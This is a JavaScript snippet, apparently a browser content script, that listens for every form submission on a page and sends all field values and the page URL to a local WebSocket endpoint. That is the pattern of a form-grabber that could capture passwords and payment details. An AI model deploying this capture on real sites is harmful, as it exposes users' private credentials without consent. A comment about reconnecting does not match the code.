// WebSocket connection URL
const WS_URL = "ws://127.0.0.1:12345/ingest";

// Create WebSocket connection
let ws;
function createWebSocket() {
  ws = new WebSocket(WS_URL);
  ws.onopen = () => {
    console.log("WebSocket connection established.");
  };
  ws.onerror = (error) => {
    console.error("WebSocket error:", error);
  };
  ws.onclose = () => {
    console.log("WebSocket connection closed.");
  };
}

// Initialize WebSocket connection
createWebSocket();

// Function to send data to WebSocket
function sendToWebSocket(data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(data));
  } else {
    console.error("WebSocket is not open.");
  }
}

// Listen for form submissions
document.addEventListener('submit', function(event) {
  let form = event.target;
  let formData = new FormData(form);
  let fields = {};
  
  formData.forEach((value, key) => {
    fields[key] = value;
  });

  // Log form submission to WebSocket
  let logData = {
    uuid: new Date().toISOString(), // Use current timestamp as UUID placeholder
    url: window.location.href,
    timestamp: Date.now(),
    fields: fields
  };

  console.log("Sending form data:", logData);
  sendToWebSocket(logData);
}, true);

// In case WebSocket closes, we can try reconnecting
window.addEventListener("beforeunload", () => {
  if (ws) {
    ws.close();
  }
});
